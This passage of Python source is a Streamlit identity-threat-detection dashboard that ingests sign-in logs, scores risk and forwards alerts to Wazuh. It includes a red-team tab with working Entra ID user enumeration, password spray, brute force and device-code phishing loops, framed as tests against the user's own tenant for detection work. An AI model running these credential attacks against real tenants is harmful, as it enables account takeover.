        <div class="argus-sidebar-brand-title">🛡️ Argus ITDR</div>
        <div class="argus-sidebar-brand-subtitle">Identity Threat Detection and Response</div>
        <div class="argus-sidebar-brand-badge">● SOC ACTIVE</div>
    </div>
    """,
    unsafe_allow_html=True,
)

MENU_OPTIONS = [
    "📥 Live Log Ingestion",
    "🤖 AI Threat Analysis & Auto-Fix",
    "⚔️ Red Team Attack Controller",
    "🛡️ Blue Team & ITDR Dashboard",
    "📊 Interactive Analytics",
    "🎯 Threat Detection Engine",
    "⚙️ SIEM Integration Test",
    "📄 Security Audit Report",
    "🔌 Integrations",
]

st.sidebar.markdown('<div class="argus-sidebar-menu-label">NAVIGATION</div>', unsafe_allow_html=True)
selected_menu = st.sidebar.radio(
    "Naviqasiya",
    MENU_OPTIONS,
    label_visibility="collapsed",
    key="argus_nav_menu",
)

render_account_sidebar()
render_ai_chatbot_sidebar()
# ========================================================================
# 🔐 END AUTHENTICATION LAYER / END SIDEBAR NAVIGATION
# ========================================================================


if 'df' not in st.session_state:
    persisted_df = storage.load_events()
    if persisted_df.empty:
        persisted_df = pd.DataFrame(columns=storage.EVENT_COLUMNS)
    st.session_state['df'] = persisted_df

if 'resolved_users' not in st.session_state:
    st.session_state['resolved_users'] = storage.load_resolved_users()

st.title("🛡️ Argus ITDR - Identity Threat Detection & Response")
st.caption("Real-time Identity Log Analysis, Dynamic Risk Scoring, Analytics & SIEM Integration")

# TAB 1: Live Log Ingestion
if selected_menu == "📥 Live Log Ingestion":
    st.header("Active Directory & Identity Logs")

    col_upload, col_reset = st.columns([4, 1])
    with col_upload:
        uploaded_file = st.file_uploader("Upload CSV Log File", type=["csv"])
    with col_reset:
        st.write("")
        st.write("")
        if st.button("🧹 Clear / Reset Telemetry", help="Yaddaşdakı bütün event-ləri və remediation tarixçəsini təmizləyir."):
            if require_login(key="clear_telemetry", message="🔐 Telemetriyanı təmizləmək üçün daxil olmalısınız."):
                st.session_state['df'] = pd.DataFrame(columns=storage.EVENT_COLUMNS)
                st.session_state['resolved_users'] = set()

                cleared_persisted = False
                for fn_name in ("clear_events", "reset_events", "delete_all_events"):
                    fn = getattr(storage, fn_name, None)
                    if callable(fn):
                        try:
                            fn()
                            cleared_persisted = True
                            break
                        except Exception:
                            pass
                for fn_name in ("clear_resolved_users", "reset_resolved_users"):
                    fn = getattr(storage, fn_name, None)
                    if callable(fn):
                        try:
                            fn()
                        except Exception:
                            pass

                if cleared_persisted:
                    st.success("✅ Sessiya yaddaşı VƏ Supabase tarixçəsi təmizləndi.")
                else:
                    st.warning("⚠️ Sessiya yaddaşı təmizləndi. `modules/storage.py`-də "
                                "`clear_events()` funksiyası tapılmadığı üçün Supabase-dəki köhnə "
                                "tarixçə səhifə yenilənəndə yenidən yüklənə bilər.")
                st.rerun()

    if uploaded_file is not None:
        if require_login(key="csv_ingest", message="🔐 CSV log-larını yükləyib emal etmək üçün daxil olmalısınız."):
            df = pd.read_csv(uploaded_file)
            st.session_state['df'] = df
            storage.append_events(df)
            st.subheader("Raw Identity Events")
            st.dataframe(ensure_timestamp_column(df), use_container_width=True)
    else:
        if not st.session_state['df'].empty:
            st.subheader("Current Telemetry Logs in Memory")
            st.caption("↕️ Ən yeni hadisələr yuxarıda göstərilir (son hücum run-unu köhnə nəticələrdən ayırd etmək üçün).")
            live_df = st.session_state['df']
            if 'Timestamp' in live_df.columns:
                live_df = live_df.sort_values('Timestamp', ascending=False)
            else:
                live_df = live_df.iloc[::-1]
            st.dataframe(ensure_timestamp_column(live_df), use_container_width=True)
        else:
            st.info("Upload identity telemetry CSV logs or use the Red Team Attack Controller to generate live attack logs.")

# TAB 2: AI Threat Analysis & Auto-Fix
elif selected_menu == "🤖 AI Threat Analysis & Auto-Fix":
    st.header("🤖 AI Threat Analysis & Remediation")

    if not config.ENABLE_REAL_REMEDIATION:
        st.caption("ℹ️ Hazırda **SIMULATION MODE**-dadır (`.env`-də `ENABLE_REAL_REMEDIATION=false`). "
                   "Remediation düymələri real Entra ID dəyişikliyi ETMİR, yalnız Wazuh-a log göndərir.")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        cols = detect_columns(df)
        event_col, user_col, ip_col = cols["event"], cols["user"], cols["ip"]

        if 'Timestamp' in df.columns:
            df = df.sort_values('Timestamp', ascending=False)
        else:
            df = df.iloc[::-1]

        if event_col:
            failed_mask = df[event_col].astype(str).str.contains('4625')
            success_mask = df[event_col].astype(str).str.contains('4624')

            threat_df = df[failed_mask | success_mask].copy()
            threat_df['_risk_level'] = threat_df[event_col].apply(classify_risk)
            threat_df = threat_df.sort_values(
                '_risk_level', key=lambda s: s.map({'COMPROMISED': 0, 'ATTEMPTED': 1}).fillna(2),
                kind='mergesort'
            )

            failed_attempts = int(failed_mask.sum())
            compromised_count = int(success_mask.sum())
        else:
            failed_attempts = len(df)
            compromised_count = 0
            threat_df = df

        resolved_count = len(st.session_state['resolved_users'])
        active_failures = max(0, failed_attempts - resolved_count)
        active_compromised = max(0, compromised_count - resolved_count)
        calculated_score = max(0, 100 - (active_failures * 10) - (active_compromised * 20))

        if calculated_score >= 80:
            risk_label = "Low Risk (Healthy Environment)"
        elif calculated_score >= 50:
            risk_label = "Medium Risk (Suspicious Activity)"
        else:
            risk_label = "Critical Risk (Active Threat Detected)"

        col1, col2, col3, col4 = st.columns(4)
        with col1:
            st.metric(
                label="Real-time Security Posture Score",
                value=f"{calculated_score} / 100",
                delta=risk_label,
                delta_color="normal" if calculated_score >= 80 else "inverse"
            )
        with col2:
            st.metric(label="Active Identity Threats", value=f"{active_failures} Events")
        with col3:
            st.metric(label="🔓 Compromised Accounts", value=f"{active_compromised} Users", delta_color="inverse")
        with col4:
            st.metric(label="Threats Remediated", value=f"{resolved_count} Users Blocked")

        st.markdown("---")
        st.subheader("💡 Dynamic Remediation Guidance & Action")

        if len(threat_df) == 0:
            st.success("✅ No active identity threats detected in telemetry.")
        else:
            for idx, row in threat_df.iterrows():
                user = str(row.get(user_col, f"User_{idx}")) if user_col else "Unknown User"
                ip = str(row.get(ip_col, "185.220.101.5")) if ip_col else "185.220.101.5"
                auth_method = row.get("AuthMethod", "OAuth2/NTLM")
                err_code = row.get("ErrorCode", "AADSTS50126")
                risk_level = row.get('_risk_level', 'ATTEMPTED')
                ts_display = row.get("Timestamp", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

                is_resolved = user in st.session_state['resolved_users']

                label_icon = "🔴 COMPROMISED" if risk_level == 'COMPROMISED' else "⚠️ ATTEMPTED"
                event_label = "4624 (SUCCESS)" if risk_level == 'COMPROMISED' else "4625 (FAILED)"

                with st.expander(
                    f"{label_icon} **[{ts_display}] Target User:** {user} | **Event ID:** {event_label} | **Error:** {err_code} | **IP:** {ip}",
                    expanded=not is_resolved
                ):
                    if is_resolved:
                        st.success(f"✅ Remediation already applied for `{user}`.")
                    else:
                        if risk_level == 'COMPROMISED':
                            st.error(f"🚨 **CRITICAL:** `{user}` SUCCESSFULLY authenticated via `{auth_method}` — account is actively compromised!")
                            st.info(f"🤖 **Suggested Action:** IMMEDIATELY revoke sessions and disable `{user}` — attacker may already hold a valid token.")
                        else:
                            st.error(f"🚨 **Risk Assessment:** Active Threat Detected on `{user}` via `{auth_method}`!")
                            st.info(f"🤖 **Suggested Action:** Revoke all Active Refresh Tokens and trigger Conditional Access Lockout for `{user}`.")

                        col_a, col_b = st.columns(2)

                        with col_a:
                            if st.button(f"🚫 Execute Remediation ({user})", key=f"btn_ai_block_{idx}_{user}"):
                                if require_login(key=f"remediate_{idx}_{user}", message="🔐 Remediation icra etmək üçün daxil olmalısınız."):
                                    use_real = config.ENABLE_REAL_REMEDIATION and attack_engine is not None

                                    if use_real:
                                        ok1, msg1 = attack_engine.revoke_sign_in_sessions(user)
                                        ok2, msg2 = attack_engine.disable_account(user)
                                        real_ok = ok1 and ok2
                                        detail = f"{msg1} | {msg2}"
                                        mode = "REAL"
                                    else:
                                        real_ok = True
                                        detail = "Simulation mode: no real Entra ID change was made."
                                        mode = "SIMULATION"

                                    alert_payload = {
                                        "timestamp": datetime.utcnow().isoformat() + "Z",
                                        "event_type": "REMEDIATION_EXECUTION",
                                        "target_user": user,
                                        "source_ip": ip,
                                        "risk_level": risk_level,
                                        "action_taken": "ACCOUNT_DISABLED_ENTRA_ID" if mode == "REAL" else "SIMULATED_LOCKOUT",
                                        "triggered_by": "Argus-Engine",
                                        "status": "SUCCESS" if real_ok else "FAILED",
                                        "detail": detail,
                                        "mode": mode,
                                    }
                                    wazuh_ok, wazuh_detail = send_to_wazuh(alert_payload)

                                    if real_ok:
                                        st.session_state['resolved_users'].add(user)
                                        storage.add_resolved_user(user)
                                        st.success(f"✅ [{mode}] {detail}")
                                    else:
                                        st.error(f"❌ [{mode}] {detail}")

                                    if wazuh_ok:
                                        st.caption("📡 Remediation event Wazuh-a uğurla göndərildi.")
                                    else:
                                        st.warning(f"⚠️ Remediation event Wazuh-a GÖNDƏRİLMƏDİ: {wazuh_detail}")
                                    st.rerun()

                        with col_b:
                            if st.button(f"🧠 Generate Sigma Rule ({user})", key=f"btn_sigma_{idx}_{user}"):
                                if require_login(key=f"sigma_{idx}_{user}", message="🔐 AI Sigma qaydası generasiyası üçün daxil olmalısınız."):
                                    try:
                                        with st.spinner("AI Sigma qaydası generasiya edir..."):
                                            engine_ai = AIServiceSwitcher()
                                            entra_log = row_to_entra_log(row.to_dict())
                                            result = engine_ai.generate_and_validate(entra_log)

                                        if result["ok"]:
                                            st.code(result["yaml"], language="yaml")
                                            if result["valid_sigma"]:
                                                st.success("✅ pySigma validasiyasından keçdi.")
                                            else:
                                                st.warning(f"⚠️ Sigma sintaksis xəbərdarlığı: {result['error']}")
                                        else:
                                            st.error(f"❌ Generasiya alınmadı: {result['error']}")
                                    except Exception as e:
                                        st.error(f"❌ AI Generator xətası: {e}")
    else:
        st.warning("⚠️ No logs ingested or generated yet. Upload CSV or run Red Team Attack Simulation.")

# TAB 3: Red Team Attack Controller & Simulation Engine
elif selected_menu == "⚔️ Red Team Attack Controller":
    st.header("⚔️ Red Team Attack Controller & Simulation Engine")
    st.caption("Execute MSAL authentication attacks against your own Microsoft Entra ID test tenant.")

    if attack_engine is None:
        st.error(f"❌ Attack Engine yüklənmədi: {attack_engine_error or 'naməlum xəta (modules/attack_engine.py tapılmadı)'}")
        st.caption(
            "`.env` faylında `ARGUS_TENANT_ID`, `ARGUS_CLIENT_ID`, `ARGUS_CLIENT_SECRET` "
            "dəyərlərini doldurduğunuzdan əmin olun."
        )
        with st.expander("ℹ️ `modules/attack_engine.py` geri qoyularkən tələb olunan interfeys"):
            st.markdown(
                "- `USERS_FILE`, `PASSWORDS_FILE` — str fayl yolları\n"
                "- `generate_wordlists()` → `{graph_fetch_ok, real_user_count, user_source, graph_fetch_detail}`\n"
                "- `class IdentityAttackEngine(users_file, passwords_file)`:\n"
                "  - `.users`, `.passwords` (list)\n"
                "  - `.public_app` — MSAL `PublicClientApplication`-uyğun: "
                "`.acquire_token_by_username_password(username, password, scopes)`, `.initiate_device_flow(scopes)`\n"
                "  - `.revoke_sign_in_sessions(username) -> (bool, str)`\n"
                "  - `.disable_account(username) -> (bool, str)`\n\n"
                "Bu interfeys tam saxlanılırsa, faylı `modules/` qovluğuna qoyan kimi "
                "Red Team tab-ı başqa heç bir kod dəyişikliyi olmadan işə düşəcək."
            )

    if wordlist_info:
        if wordlist_info["graph_fetch_ok"]:
            st.success(
                f"📡 İstifadəçi mənbəyi: **Microsoft Graph (canlı)** — "
                f"{wordlist_info['real_user_count']} real istifadəçi tapıldı."
            )
        else:
            st.warning(
                f"⚠️ İstifadəçi mənbəyi: **{wordlist_info['user_source']}**. "
                f"Graph sorğusu uğursuz oldu: {wordlist_info['graph_fetch_detail']}"
            )

    _active_wazuh_cfg = integrations.get_active_wazuh_config()
    if _active_wazuh_cfg["ingest_url"]:
        _cfg_src_label = "⚙️ Integrations tab (UI)" if _active_wazuh_cfg["source"] == "ui" else ".env"
        st.caption(f"📡 Hadisələr Ingest Bridge üzərindən göndərilir: `{_active_wazuh_cfg['ingest_url']}` (mənbə: {_cfg_src_label})")
    else:
        st.caption(
            f"📡 Hadisələr Wazuh manager-in tail etdiyi lokal fayla yazılır: `{_ARGUS_LOG_FILE}`. "
            "Bu qovluq docker-compose-da `wazuh.manager` konteynerinin `/var/log/argus` qovluğuna "
            "bind-mount edilməlidir və `local_rules.xml` manager-ə yüklənməlidir (bax: `WAZUH_SETUP.md`)."
        )

    col_left, col_right = st.columns([1, 1])

    with col_left:
        st.subheader("⚙️ Custom Attack Parameters")
        default_domain = config.DOMAIN or "example.onmicrosoft.com"
        target_user_input = st.text_input("Target User (for Brute Force / MFA)", value=f"user2@{default_domain}")
        spray_password_input = st.text_input("Spray Password", value="")
        custom_brute_password = st.text_input(
            "🎯 Custom Brute Force Password (optional)",
            value="",
            help="Buraya yazdığınız şifrə, standart wordlist-ə ƏLAVƏ olaraq "
                 "(və ilk sırada) brute force siyahısına daxil edilir."
        )
        max_targets_count = st.slider("Max Target Limit", min_value=1, max_value=50, value=18)

        st.markdown("---")
        st.subheader("🎯 Attack Triggers")

        btn_enum = st.button("🔍 Launch User Enumeration", disabled=attack_engine is None)
        btn_spray = st.button("🚀 Launch Password Spray Attack", disabled=attack_engine is None)
        btn_brute = st.button("🔨 Launch Brute Force Attack", disabled=attack_engine is None)
        btn_mfa = st.button("📲 Launch MFA Fatigue Simulation", disabled=attack_engine is None)
        btn_device = st.button("🔑 Launch Device Code Flow Phishing", disabled=attack_engine is None)

    with col_right:
        st.subheader("🖥️ Live Attack Terminal Console (`attack_engine.py`)")
        terminal_placeholder = st.empty()

        terminal_placeholder.code(
            "[+] Attack Engine Initialized...\n"
            f"[+] Target Domain: {config.DOMAIN or '(not configured)'}\n"
            "[*] Ready to execute authentication attempts against Entra ID.",
            language="bash"
        )

    _redteam_triggered = attack_engine is not None and (btn_enum or btn_spray or btn_brute or btn_mfa or btn_device)
    if _redteam_triggered and not require_login(
        key="redteam_attack", message="🔐 Red Team hücum simulyasiyasını icra etmək üçün daxil olmalısınız."
    ):
        _redteam_triggered = False

    if _redteam_triggered:
        console_logs = []
        new_events = []

        if btn_enum:
            console_logs.append(f"[*] Executing User Enumeration (Max: {max_targets_count})...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            for user in attack_engine.users[:max_targets_count]:
                try:
                    result = attack_engine.public_app.acquire_token_by_username_password(
                        username=user, password="DummyPassword123!", scopes=["https://graph.microsoft.com/.default"]
                    )
                    err_desc = result.get("error_description", "")
                    if any(code in err_desc for code in ["AADSTS50126", "AADSTS50055", "AADSTS50053", "AADSTS7000218"]):
                        status_text = f"[+] MÖVCUDDUR (Valid User): {user}"
                    elif "AADSTS50034" in err_desc:
                        status_text = f"[-] MÖVCUD DEYİL (Invalid User): {user}"
                    else:
                        status_text = f"[?] CAVAB ({user}): {err_desc[:40]}..."
                except Exception as e:
                    status_text = f"[-] UĞURSUZ (exception): {user} -> ({str(e)[:60]}...)"
                    time.sleep(1.5)

                console_logs.append(status_text)
                terminal_placeholder.code("\n".join(console_logs), language="bash")
                time.sleep(0.3)

        elif btn_spray:
            if not spray_password_input:
                st.warning("Spray Password boşdur — sınaq üçün bir şifrə daxil edin.")
            else:
                console_logs.append(f"[*] Executing Password Spray...\n")
                terminal_placeholder.code("\n".join(console_logs), language="bash")

                for user in attack_engine.users[:max_targets_count]:
                    try:
                        result = attack_engine.public_app.acquire_token_by_username_password(
                            username=user, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
                        )
                    except Exception as e:
                        res_line = f"[-] UĞURSUZ (exception): {user} -> ({str(e)[:80]}...)"
                        console_logs.append(res_line)
                        terminal_placeholder.code("\n".join(console_logs), language="bash")
                        new_events.append({
                            "EventID": 4625,
                            "TargetUserName": user,
                            "IpAddress": "185.220.101.5",
                            "Status": "FAILED",
                            "AuthMethod": "PasswordSpray",
                            "ErrorCode": f"MSAL_EXCEPTION: {type(e).__name__}",
                            "Timestamp": datetime.utcnow().isoformat() + "Z"
                        })
                        time.sleep(1.5)
                        continue

                    if "access_token" in result:
                        res_line = f"[+] UĞURLU: {user}"
                        evt_id = 4624
                        status = "SUCCESS"
                    else:
                        err_desc = result.get("error_description", "")
                        err = err_desc.splitlines()[0] if err_desc else result.get("error", "naməlum xəta")
                        res_line = f"[-] UĞURSUZ: {user} -> ({err[:40]}...)"
                        evt_id = 4625
                        status = "FAILED"

                    console_logs.append(res_line)
                    terminal_placeholder.code("\n".join(console_logs), language="bash")

                    new_events.append({
                        "EventID": evt_id,
                        "TargetUserName": user,
                        "IpAddress": "185.220.101.5",
                        "Status": status,
                        "AuthMethod": "PasswordSpray",
                        "ErrorCode": result.get("error", "None"),
                        "Timestamp": datetime.utcnow().isoformat() + "Z"
                    })

                    time.sleep(0.4)

        elif btn_brute:
            console_logs.append(f"[*] Executing Brute Force against {target_user_input}...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            wordlist_sample = attack_engine.passwords[:5]
            if custom_brute_password:
                test_passwords = [custom_brute_password] + [
                    p for p in wordlist_sample if p != custom_brute_password
                ]
                console_logs.append(f"[*] Xüsusi şifrə siyahının əvvəlinə əlavə olundu: '{custom_brute_password}'")
                terminal_placeholder.code("\n".join(console_logs), language="bash")
            else:
                test_passwords = wordlist_sample

            for pwd in test_passwords:
                try:
                    result = attack_engine.public_app.acquire_token_by_username_password(
                        username=target_user_input, password=pwd, scopes=["https://graph.microsoft.com/.default"]
                    )
                except Exception as e:
                    console_logs.append(f"[-] UĞURSUZ (exception): {pwd} -> ({str(e)[:60]}...)")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")
                    time.sleep(1.5)
                    continue

                if "access_token" in result:
                    console_logs.append(f"[+] UĞURLU: Doğru şifrə tapıldı -> '{pwd}'")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")

                    console_logs.append("\n[*] Running Post-Exploitation Reconnaissance...")
                    headers = {"Authorization": f"Bearer {result['access_token']}"}
                    resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
                    if resp.status_code == 200:
                        u_data = resp.json()
                        console_logs.append(f"[+] User Info Retrieved: {u_data.get('displayName')} ({u_data.get('userPrincipalName')})")
                    break
                else:
                    err_desc = result.get("error_description", "")
                    err = err_desc.splitlines()[0] if err_desc else result.get("error", "naməlum xəta")
                    console_logs.append(f"[-] UĞURSUZ: {pwd} -> ({err[:35]}...)")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")
                time.sleep(0.5)

        elif btn_mfa:
            console_logs.append(f"[*] Executing MFA Fatigue Simulation against {target_user_input}...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            if not spray_password_input:
                st.warning("MFA simulyasiyası üçün Spray Password sahəsinə hədəfin bilinən şifrəsini daxil edin.")
            else:
                for i in range(1, 3):
                    console_logs.append(f"[*] Attempt #{i}...")
                    try:
                        result = attack_engine.public_app.acquire_token_by_username_password(
                            username=target_user_input, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
                        )
                        err_desc = result.get("error_description", "")
                        first_line = err_desc.splitlines()[0] if err_desc else "Success/Token"
                    except Exception as e:
                        first_line = f"exception: {str(e)[:60]}"
                    console_logs.append(f" └─ Response: {first_line[:55]}...")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")
                    time.sleep(1)

        elif btn_device:
            console_logs.append("[*] Initiating OAuth Device Code Flow...\n")
            flow = attack_engine.public_app.initiate_device_flow(scopes=["https://graph.microsoft.com/.default"])
            if "user_code" in flow:
                console_logs.append(f"[+] Verification URL: {flow['verification_uri']}")
                console_logs.append(f"[+] User Code: {flow['user_code']}")
            else:
                console_logs.append("[-] Device Code Flow initiation failed.")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

        if new_events:
            new_df = pd.DataFrame(new_events)
            st.session_state['df'] = pd.concat([st.session_state['df'], new_df], ignore_index=True)
            storage.append_events(new_df)

            wazuh_ok_count = 0
            wazuh_fail_count = 0
            wazuh_errors = []

            for ev in new_events:
                wazuh_ok, wazuh_result = send_to_wazuh({
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                    "event_id": ev["EventID"],
                    "user": ev["TargetUserName"],
                    "source_ip": ev["IpAddress"],
                    "rule_title": "RedTeam MSAL Attack Executed",
                    "severity": "HIGH",
                    "source": "Argus-RedTeam-Engine"
                })
                if wazuh_ok:
                    wazuh_ok_count += 1
                else:
                    wazuh_fail_count += 1
                    wazuh_errors.append(f"{ev['TargetUserName']}: {wazuh_result}")

            console_logs.append(f"\n[*] Wazuh dispatch: {wazuh_ok_count} OK, {wazuh_fail_count} FAILED")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            if wazuh_fail_count == 0:
                st.success(f"✅ Attack execution completed — {wazuh_ok_count} events written to the Argus log bridge.")
            else:
                st.error(
                    f"⚠️ Attack execution completed, but {wazuh_fail_count}/{len(new_events)} "
                    f"events FAILED to reach the Argus log bridge."
                )
                with st.expander("🔎 Wazuh dispatch error details (root cause)"):
                    for err in wazuh_errors:
                        st.code(err)
                    st.caption(
                        "Tipik səbəblər: `ARGUS_INGEST_URL` yanlışdır/əlçatan deyil, "
                        "receiver.py evinizdə işləmir, ngrok tuneli dəyişib, "
                        "və ya `ARGUS_LOG_DIR` yazıla bilən deyil (lokal rejimdə)."
                    )
        else:
            st.success("Attack execution completed.")

# TAB 4: Blue Team & ITDR Dashboard
elif selected_menu == "🛡️ Blue Team & ITDR Dashboard":
    st.header("🛡️ Blue Team & ITDR Monitoring Dashboard")
    st.caption("📜 **All-Time History** — bu dashboard bütün əvvəlki hücum run-larının məlumatını (SQLite-da persist olunmuş) birlikdə göstərir, "
               "təkcə son run-u deyil. Yalnız indiki run-a baxmaq üçün Live Log Ingestion və AI Threat Analysis menyularına keçin (ən yeni yuxarıda sıralanır).")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        cols = detect_columns(df)
        event_col, user_col, ip_col = cols["event"], cols["user"], cols["ip"]

        st.subheader("🔒 Active Lockout Watchlist (Smart Lockout Triggered)")

        if event_col and user_col:
            lockout_users = df[event_matches(df[event_col], 4625)][user_col].value_counts()
            locked_accounts = lockout_users[lockout_users >= 3].index.tolist()
        else:
            lockout_users = pd.Series(dtype=int)
            locked_accounts = []

        if len(locked_accounts) > 0:
            cols_ui = st.columns(min(len(locked_accounts), 4))
            for idx, account in enumerate(locked_accounts):
                with cols_ui[idx % 4]:
                    st.error(f"👤 **Account:** `{account}`\n\n🚨 **Status:** LOCKED (AADSTS50053)\n\n📍 **Attempts:** {lockout_users[account]} Failures")
        else:
            st.success("✅ No accounts currently locked by Microsoft Smart Lockout threshold.")

        st.markdown("---")

        st.subheader("🔓 Compromised Accounts (Successful Logon After/During Attack)")

        if event_col and user_col:
            compromised_mask = df[event_col].astype(str).str.contains('4624')
            compromised_users_df = df[compromised_mask]
            compromised_accounts = compromised_users_df[user_col].dropna().unique().tolist()
        else:
            compromised_accounts = []

        if len(compromised_accounts) > 0:
            cols_comp = st.columns(min(len(compromised_accounts), 4))
            for idx, account in enumerate(compromised_accounts):
                acc_ip = compromised_users_df[compromised_users_df[user_col] == account][ip_col].iloc[0] if ip_col else "N/A"
                is_resolved = account in st.session_state['resolved_users']
                with cols_comp[idx % 4]:
                    if is_resolved:
                        st.success(f"👤 **Account:** `{account}`\n\n✅ **Status:** Remediated\n\n📍 **IP:** {acc_ip}")
                    else:
                        st.error(f"👤 **Account:** `{account}`\n\n🚨 **Status:** COMPROMISED (4624 SUCCESS)\n\n📍 **IP:** {acc_ip}\n\n⚠️ Session revoke + disable required!")
        else:
            st.success("✅ No successful attacker logons detected — no accounts currently compromised.")

        st.markdown("---")

        col_feed, col_logs = st.columns([1, 1.2])

        with col_feed:
            st.subheader("⚡ Live Incident Feed")
            severity_filter = st.selectbox("Filter by Severity", ["ALL", "CRITICAL", "HIGH", "MEDIUM", "LOW"])

            for idx, row in df.iterrows():
                event_id = row.get(event_col, 4625) if event_col else 4625
                user = row.get(user_col, "Unknown") if user_col else "Unknown"
                ip = row.get(ip_col, "127.0.0.1") if ip_col else "127.0.0.1"
                err_code = row.get("ErrorCode", "AADSTS50126")
                ts_display = row.get("Timestamp", "")

                risk = classify_risk(event_id)

                if risk == "COMPROMISED":
                    sev = "CRITICAL"
                elif err_code == "AADSTS50053" or (risk == "ATTEMPTED" and idx > 3):
                    sev = "CRITICAL"
                elif err_code == "AADSTS50034":
                    sev = "MEDIUM"
                elif risk == "ATTEMPTED":
                    sev = "HIGH"
                else:
                    sev = "LOW"

                if severity_filter != "ALL" and sev != severity_filter:
                    continue

                ts_prefix = f"`[{ts_display}]` " if ts_display else ""

                if sev == "CRITICAL" and risk == "COMPROMISED":
                    st.error(f"🔴 **[CRITICAL]** {ts_prefix}Successful Attacker Logon (`4624`) — Account COMPROMISED: `{user}` from `{ip}`")
                elif sev == "CRITICAL":
                    st.error(f"🔴 **[CRITICAL]** {ts_prefix}Account Lockout / Brute Force on `{user}` from `{ip}` | Error: `{err_code}`")
                elif sev == "HIGH":
                    st.warning(f"🟠 **[HIGH]** {ts_prefix}Failed Authentication (`4625`) on `{user}` from `{ip}` | Error: `{err_code}`")
                elif sev == "MEDIUM":
                    st.info(f"🟡 **[MEDIUM]** {ts_prefix}User Enumeration (`4625`) on `{user}` from `{ip}` | Error: `{err_code}`")
                else:
                    st.info(f"🟢 **[LOW]** {ts_prefix}Informational event for `{user}` from `{ip}`")

        with col_logs:
            st.subheader("📋 Entra ID Sign-in Logs Table")
            st.caption("🔴 Kompromis olmuş (4624) sətirlər ən yuxarıda göstərilir ki, cədvəldə itməsin.")
            display_df = df.copy()
            if event_col:
                display_df['_risk'] = display_df[event_col].apply(classify_risk)
                display_df = display_df.sort_values(
                    '_risk', key=lambda s: s.map({'COMPROMISED': 0, 'ATTEMPTED': 1}).fillna(2),
                    kind='mergesort'
                ).drop(columns=['_risk'])
            st.dataframe(ensure_timestamp_column(display_df), use_container_width=True)
    else:
        st.warning("⚠️ No telemetry feed available. Ingest logs in Live Log Ingestion or trigger Red Team simulation in Red Team Attack Controller.")

# TAB 5: Interactive Analytics
elif selected_menu == "📊 Interactive Analytics":
    st.header("📊 Interactive Analytics & Threat Visualizations")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        cols = detect_columns(df)
        event_col, user_col = cols["event"], cols["user"]

        col_left, col_right = st.columns(2)

        with col_left:
            st.subheader("🎯 Top 5 Targeted Accounts")
            if event_col and user_col:
                failed_df = df[event_matches(df[event_col], 4625)]
                if len(failed_df) > 0:
                    top_users = failed_df[user_col].value_counts().head(5).reset_index()
                    top_users.columns = ['Account Name', 'Failed Attempts']

                    fig_bar = px.bar(top_users, x='Failed Attempts', y='Account Name', orientation='h',
                                      color='Failed Attempts', color_continuous_scale='Reds', text='Failed Attempts')
                    st.plotly_chart(fig_bar, use_container_width=True)
                else:
                    st.info("No failed logon attempts recorded.")
            else:
                st.info("İstifadəçi/hadisə sütunları tapılmadı.")

        with col_right:
            st.subheader("📊 Failure vs Success Ratio")
            if event_col:
                status_labels = df[event_col].apply(
                    lambda x: 'SUCCESS (4624)' if classify_risk(x) == 'COMPROMISED'
                    else ('FAILED (4625)' if classify_risk(x) == 'ATTEMPTED' else 'OTHER')
                )
                status_counts = status_labels.value_counts().reset_index()
                status_counts.columns = ['Logon Status', 'Event Count']

                fig_pie = px.pie(status_counts, names='Logon Status', values='Event Count', color='Logon Status',
                                  color_discrete_map={'FAILED (4625)': '#ef553b', 'SUCCESS (4624)': '#00cc96', 'OTHER': '#888888'}, hole=0.4)
                st.plotly_chart(fig_pie, use_container_width=True)

        st.markdown("---")
        st.subheader("📈 Attack Intensity Timeline & Velocity")
        df_timeline = df.copy()
        df_timeline['Attempt_Sequence'] = df_timeline.index + 1

        if event_col:
            df_timeline['Event_Type'] = df_timeline[event_col].apply(
                lambda x: "Success Logon (4624)" if classify_risk(x) == 'COMPROMISED'
                else ("Failed Logon (4625)" if classify_risk(x) == 'ATTEMPTED' else "Other"))
            fig_line = px.line(df_timeline, x='Attempt_Sequence', y=df_timeline.index, color='Event_Type', markers=True,
                                color_discrete_map={'Failed Logon (4625)': '#d62728', 'Success Logon (4624)': '#2ca02c', 'Other': '#888888'})
            st.plotly_chart(fig_line, use_container_width=True)
    else:
        st.warning("⚠️ No data available for visualization.")

# TAB 6: Threat Detection Engine
elif selected_menu == "🎯 Threat Detection Engine":
    st.header("Threat Detection Engine")
    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        st.warning("⚠️ High Risk Identity Threats Detected!")

        st.subheader("📋 Pending Telemetry (Dispatch Preview)")
        st.dataframe(ensure_timestamp_column(df), use_container_width=True)

        if st.button("🚨 Dispatch All Threats to Wazuh SIEM"):
            if require_login(key="dispatch_all_threats", message="🔐 Hadisələri Wazuh SIEM-ə göndərmək üçün daxil olmalısınız."):
                success_count = 0
                fail_details = []
                for idx, row in df.iterrows():
                    payload = {
                        "timestamp": datetime.utcnow().isoformat() + "Z",
                        "event_id": row.get("EventID", 4625),
                        "user": row.get("TargetUserName", "unknown"),
                        "source_ip": row.get("IpAddress", "127.0.0.1"),
                        "rule_title": "Identity Anomaly Detected",
                        "severity": "HIGH", "source": "Argus-ITDR"
                    }
                    status, detail = send_to_wazuh(payload)
                    if status:
                        success_count += 1
                    else:
                        fail_details.append(f"{payload['user']}: {detail}")

                if not fail_details:
                    st.success(f"✅ Dispatched {success_count} events to the Argus log bridge!")
                else:
                    st.error(f"⚠️ Dispatched {success_count}/{len(df)} events. {len(fail_details)} failed.")
                    with st.expander("🔎 Failure details"):
